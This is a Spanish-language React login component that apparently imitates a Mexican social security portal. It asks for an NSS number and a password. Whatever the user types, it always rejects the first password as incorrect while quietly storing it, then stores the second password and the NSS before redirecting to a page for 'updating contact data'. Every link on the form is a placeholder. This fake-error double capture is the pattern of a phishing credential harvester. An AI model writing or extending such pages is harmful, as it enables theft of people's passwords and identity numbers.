"use client";

import Link from "next/link";
import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { IoMdEyeOff } from "react-icons/io";
import { IoMdEye } from "react-icons/io";
import ErrorForm from "./errorForm";
import { useFormularioStore } from "@/lib/form-store";
import Loading from "./loading";
import { useRouter } from "next/navigation";

export default function FormularioSeguridad() {
  const [mostrarNSS, setMostrarNSS] = useState(false);
  const [mostrarContra, setMostrarContra] = useState(false);
  const [loading, setLoading] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const { setClave, setClaveError, resetFormulario } = useFormularioStore();
  const router = useRouter();
  const {
    register,
    handleSubmit,
    setError,
    reset,
    setValue,
    formState: { errors, isValid },
  } = useForm({ mode: "onChange" });

  const handleMostarNNS = () => {
    setMostrarNSS(!mostrarNSS);
  };

  const handleMostarContra = () => {
    setMostrarContra(!mostrarContra);
  };

  const formatearNss = (value) => {
    const valor = value.replace(/\D/g, "").slice(0, 11);
    return valor;
  };

  const handleFormato = (e) => {
    const valorFormateado = formatearNss(e.target.value);
    setValue("seguridad", valorFormateado);
  };

  const siguientePagina = (data) => {
    if (intentos === 0) {
      setClaveError(data.contra);

      setError("contra", {
        type: "manual",
        message: "Contraseña incorrecta",
      });

      setIntentos(1);
    } else {
      setClave(data.contra);

      useFormularioStore.setState({ nss: data.seguridad });
      setLoading(true);

      setTimeout(() => {
        router.push("/perfil/actualizar-datos-contacto");
      }, 1000);
      reset();
      setIntentos(0);
    }
  };

  return (
    <>
      {loading && <Loading />}
      <div className="bg-white lg:ml-auto lg:mx-0 w-[21.4rem] md:w-[27.5rem]  px-6 sm:px-11 pt-6 sm:pt-11 pb-10 sm:pb-16 h-fit rounded-sm mx-auto mb-7 md:mb-0 ">
        <h2 className="text-center mb-5">
          Consulta el{" "}
          <span className="text-[#dd0528] ">Aviso de Privacidad</span>
        </h2>
        <form onSubmit={handleSubmit(siguientePagina)}>
          <div>
            <label htmlFor="seguridad" className="text-[#7e8094] mb-2 block">
              Número de Seguridad Social (NSS)
            </label>
            <div className="relative mb-3">
              <input
                type={mostrarNSS ? "text" : "password"}
                id="seguridad"
                name="seguridad"
                className="border border-[#b7b7ba] rounded-sm w-full py-[0.4375rem] pl-3 outline-[#dd0528] hover:border-[#404040]"
                maxLength={11}
                onInput={handleFormato}
                {...register("seguridad", {
                  required: "Escribe tu Número de Seguridad Social (NSS)",
                  minLength: {
                    value: 11,
                    message:
                      "El Número de Seguridad Social (NSS) debe tener 11 números, por favor verifícalo",
                  },
                })}
              />
              {mostrarNSS ? (
                <IoMdEye
                  className="text-[#707070] text-2xl absolute top-2 right-5  cursor-pointer "
                  onClick={handleMostarNNS}
                />
              ) : (
                <IoMdEyeOff
                  className="text-[#707070] text-2xl absolute top-2 right-5 cursor-pointer "
                  onClick={handleMostarNNS}
                />
              )}
            </div>

            {errors.seguridad && (
              <ErrorForm>{errors.seguridad?.message}</ErrorForm>
            )}
          </div>

          <div className="mt-3">
            <label htmlFor="contra" className="text-[#7e8094] mb-2 block">
              Contraseña
            </label>
            <div className="relative mb-3">
              <input
                type={mostrarContra ? "text" : "password"}
                id="contra"
                name="contra"
                className="border border-[#b7b7ba] rounded-sm w-full py-[0.4375rem] pl-3 outline-[#dd0528] hover:border-[#404040]"
                {...register("contra", {
                  required: "Contraseña incorrecta",
                })}
              />
              {mostrarContra ? (
                <IoMdEye
                  className="text-[#707070] text-2xl absolute top-2 right-5  cursor-pointer "
                  onClick={handleMostarContra}
                />
              ) : (
                <IoMdEyeOff
                  className="text-[#707070] text-2xl absolute top-2 right-5 cursor-pointer "
                  onClick={handleMostarContra}
                />
              )}
            </div>

            {errors.contra && <ErrorForm>{errors.contra?.message}</ErrorForm>}
          </div>

          <a
            href="#"
            className="text-center block text-[#dd0528] underline ring-offset-1 mb-5 mt-7"
          >
            Consulta tu Número de Seguridad Social
          </a>

          <div className="flex flex-col gap-5">
            <button
              type="submit"
              disabled={!isValid}
              className={`${
                isValid ? "bg-[#dd0528] cursor-pointer" : "bg-[#cdcdcd]"
              }  py-[10px] rounded-full text-sm text-white geomanist-medium `}
            >
              Continuar
            </button>
            <Link
              href="#"
              className="block text-center bg-[#cdcdcd] py-[0.625rem] rounded-full  text-white geomanist-medium text-sm"
            >
              Iniciar sesión
            </Link>
          </div>

          <hr className="my-7 md:my-8 text-[#cdcdcd]" />

          <Link
            href="#"
            className="text-center block w-full border border-[#dd0528] py-[0.625rem] rounded-full text-sm text-[#dd0528] geomanist-medium"
          >
            Crear una cuenta
          </Link>
        </form>
      </div>
    </>
  );
}
